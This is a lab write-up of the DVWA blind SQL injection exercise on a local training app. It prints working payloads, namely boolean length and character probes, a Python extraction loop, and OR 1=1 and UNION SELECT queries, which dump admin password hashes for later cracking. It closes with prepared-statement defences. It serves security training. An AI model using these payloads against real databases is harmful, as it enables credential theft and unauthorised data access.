---
description: http://localhost/DVWA/vulnerabilities/sqli_blind/
---

# SQLi Blind

<details>

<summary>What is a SQL Injection Blind?</summary>

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as [`UNION` attacks](https://portswigger.net/web-security/sql-injection/union-attacks) are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

</details>

{% embed url="https://portswigger.net/web-security/sql-injection/blind" %}
[https://portswigger.net/web-security/sql-injection/blind](https://portswigger.net/web-security/sql-injection/blind)
{% endembed %}

{% hint style="info" %}
Using BurpSuite and the FoxyProxy extension is recommended.
{% endhint %}

## Low

We've an input type text that received an User ID in I by user and submit request using the Submit button:

<div align="left"><figure><img src="../.gitbook/assets/image (46) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

In SQL Blind we obtain a boolean result (exist or not exist) of our query, then we need to be able to ask correctly information from DB, make script can be the best approach.

<figure><img src="../.gitbook/assets/image (47) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This's our request captured by Burp Suite, while here below there's a php source code:

<figure><img src="../.gitbook/assets/image (41) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

How the same in the low level, there're not input sanitation, then we can send what we want into input type text field. In this case request will arrive to DB located into webserver, but query will be preparared using php language.

Analyzing source code, we know that mysql query is:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

#### 1st Payload (length)

Regarding query and that our input type value is insert into $id variable, we need to do multiple question to DB regarding password length.

Then in this case, we can use following payload: `1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 31)='x' #`&#x20;

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 30)='x' #';
```

_admin password length is > 31?_

<div align="left"><figure><img src="../.gitbook/assets/image (48) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

User ID exists in the DB = true.

We need to continue to ask questions for obtain a correct value.

_admin password length is > 32?_

<div align="left"><figure><img src="../.gitbook/assets/image (49) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

No! Answer is wrong, then regarding last two answer, we know that admin password length has 32 characters.

Of course we can use an automated python script to do this automatically:

{% embed url="https://github.com/LeonardoE95/DVWA/blob/main/src/sqli_blind/low.py" %}

#### 2nd Payload (value)

starting with the first character, up to the last (which we know from the length we have just obtained) we must repeatedly query the DB asking whether or not the password character of the i-th position includes one of the possible alphanumeric characters.

```python
for i in range(1, password_length+1):
    for c in ALPHABET:
        sql_payload = f"1' AND (select substring(password, {i}, 1) from users where first_name='{username}')='{c}' #"
        if sql2bool(sql_payload):
            password += c
            print(c, end="", flush=True) # to print in a cool way
            break
```

Then, our query will be:

`1' AND (select substring(password, 1, 1) from users where first_name='admin')='5' #`&#x20;

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' AND (select substring(password, 1, 1) from users where first_name='admin')='5' #';
```

Is the first character of admin password equals to 'a'?

<div align="left"><figure><img src="../.gitbook/assets/image (50) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

No! again, is the first character of admin password equals to '5'?

<div align="left"><figure><img src="../.gitbook/assets/image (52) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Very good, the first character is 5, then we can continue to increment index and redo all questions until the final string will be discovered.

{% hint style="warning" %}
The input is not sanitized, so I can execute any (potentially malicious) command.
{% endhint %}

## Medium

Here, there're a select with range (1 to 5) to set User ID.

<div align="left"><figure><img src="../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure></div>

In addition to low level, in the code below there're an escape string control and query variable $ID isn't enclosed by ''.



Our request include an ID + Submit values.

<figure><img src="../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

But, we can modify ID value using Burp Suite repeater function:

<figure><img src="../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

#### 1st Payload

Remembering that $ID variable isn't enclosed by '', escape string control isn't a matter.

Then in this case, we can use following payload: `1 OR 1=1 --`&#x20;

```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1 -- ;
```

in the where condition there're a first search to user with this id '' OR a true condition, plus a comment.

<figure><img src="../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

#### 2nd Payload

How the low level, regarding that query selects: first\_name, last\_name field from users table, we can use [UNION](https://www.w3schools.com/sql/sql_union.asp) operator to add a new query:  1 `UNION select first_name,password from users --`&#x20;

```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT first_name,password FROM users -- ';
```

<figure><img src="../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

We obtain hash of psw to eventually crack using tools such as: [Hashcat](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/hashcat) and [John The Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper).

Note: Every `SELECT` statement within `UNION` must have the same number of columns.

{% hint style="warning" %}
The input is not sanitized, so I can execute any (potentially malicious) command.
{% endhint %}

## High

In this level clicking on first page, we obtain a redirect to a second page to submit effectively our Session ID:

<figure><img src="../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (43) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure></div>

#### 1st Payload

In this case payload is always the same of low level, but we need to add it into second page, infact we've two request (GET and POST)

However, we can use following payload: `1' OR 1=1 --`&#x20;

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1 -- ';
```

that permit us to see all DB results:

<figure><img src="../.gitbook/assets/image (39) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### 2nd Payload

How last levels, we can use [UNION](https://www.w3schools.com/sql/sql_union.asp) operator to add a new query:  `' UNION select first_name,password from users --`&#x20;

```sql
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT first_name,password FROM users -- ';
```

<div align="left"><figure><img src="../.gitbook/assets/image (40) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

We obtain hash of psw to eventually crack using tools such as: [Hashcat](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/hashcat) and [John The Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper).

Note: Every `SELECT` statement within `UNION` must have the same number of columns.

{% hint style="warning" %}
The input is not sanitized, so I can execute any (potentially malicious) command.
{% endhint %}

## Impossible

<figure><img src="../.gitbook/assets/image (44) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The best solution is to sanitize query using a prepared statement, to delineate part static and dinamic (id) of query; take a binding parameter to check if is it an integer or char; insert a control to count rows number as result; and use a [CSRF](csrf.md) token.

All this permits to separate sql code with sql data/parameter insert by user.

## References

For the making of this solution the following resource were used:

* [https://github.com/LeonardoE95/DVWA/tree/main/src/sqli\_blind](https://github.com/LeonardoE95/DVWA/tree/main/src/sqli_blind)

{% content-ref url="https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/main-contents/15-sql-injection" %}
[15 - SQL Injection](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/main-contents/15-sql-injection)
{% endcontent-ref %}

{% content-ref url="https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/sqlmap" %}
[SQLMap](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/sqlmap)
{% endcontent-ref %}
